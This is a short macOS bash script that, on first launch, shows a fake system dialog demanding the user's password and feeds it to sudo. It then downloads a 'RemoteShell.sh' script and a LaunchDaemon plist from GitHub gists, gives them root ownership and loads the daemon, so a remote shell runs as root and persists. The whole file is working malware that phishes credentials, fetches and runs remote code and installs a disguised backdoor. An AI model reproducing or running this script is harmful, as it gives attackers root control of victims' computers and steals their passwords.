#!/bin/bash

if [ -e /usr/local/mycode/persist.sh ]; then
  :
else
  PASSWORD=$(osascript -e 'Tell application "System Events" to display dialog "Enter your password (Required on first Launch):" with hidden answer default answer ""' -e 'text returned of result')

  echo "$PASSWORD" | sudo -S curl -L -o /usr/local/mycode/persist.sh https://gist.githubusercontent.com/Astranix593/460201b6e3dad1cb4608a04b8848a9be/raw/cb33e3c1d6496edcaf28bd28524a212667ccb79f/RemoteShell.sh
  sudo curl -L -o /Library/LaunchDaemons/com.cfhelper.persist.plist https://gist.githubusercontent.com/Astranix593/b8eb443998a04671210a7843a7c2fa01/raw/f6daf4f6f21773e3db3318292530f5545a5c9a92/com.cfhelper.persist.plist
  sudo chown root:wheel /usr/local/mycode/persist.sh
  sudo chmod +x /usr/local/mycode/persist.sh
  sudo chown root:wheel /Library/LaunchDaemons/com.cfhelper.persist.plist
  sudo chmod 644 /Library/LaunchDaemons/com.cfhelper.persist.plist
  sudo launchctl load /Library/LaunchDaemons/com.cfhelper.persist.plist
fi